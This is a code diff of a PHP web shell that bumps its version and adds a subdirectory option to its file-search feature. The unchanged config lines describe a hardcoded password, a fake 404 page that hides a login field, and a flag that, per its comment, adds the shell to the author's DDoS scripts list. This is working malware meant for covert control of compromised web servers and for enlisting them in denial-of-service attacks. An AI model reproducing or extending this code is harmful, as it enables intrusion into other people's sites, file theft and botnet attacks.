@@ -1,6 +1,6 @@
 <?php
 $pass               = md5("pw");
-$version            = 3.5;
+$version            = 3.51;
 $adaptiveerrorpage  = true; //Get Default 404 page and replicate it, but add a login text field in the center at the bottom
 $checkforupdates    = true;
 $helpsupportbooter  = true; //True adds the shell to my ddos scripts list, I can't log in providing you change the password above
@@ -602,7 +602,7 @@ function settable(tablename,doing,page) {
 	window.onbeforeunload = null;
 	$(\'gooddbform\').submit();
 }
-function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb) {
+function sv(action,nowpath,p1,p2,p3,p4,p5,charsetpage,dir,findstr,findin,re,writabledb,subdirs) {
 	if(action != null) $(\'opform\').action.value=action;
 	if(nowpath != null) $(\'opform\').nowpath.value=nowpath;
 	if(p1 != null) $(\'opform\').p1.value=p1;
@@ -1214,19 +1214,19 @@ function shownav(e){
                 $infile = ($findin == "Find in File Content");
                 if ($re){
                     if ($infile){
-                        if (!$prgm('@' . $findstr . '@', @file_get_contents($nowpath . $file))) continue;
+                        if (!$prgm('@' . $findstr . '@', @file_get_contents(($subdirs ? "" : $nowpath) . $file))) continue;
                     }else{
                         if (!$prgm('@' . $findstr . '@', $file)) continue;
                     }
                 }else{
                     if ($infile){
-                        if (!(strpos(@file_get_contents($nowpath . $file), $findstr) !== FALSE)) continue;
+                        if (!(strpos(@file_get_contents(($subdirs ? "" : $nowpath) . $file), $findstr) !== FALSE)) continue;
                     }else{
                         if (!(strpos($file, $findstr) !== FALSE)) continue;
                     }
                 }
             }
-            $filepath = $nowpath . $file;
+            $filepath = ($subdirs ? "" : $nowpath) . $file;
             if (@is_dir($filepath)) {
                 $dirdb['filename']    = $file;
                 $dirdb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
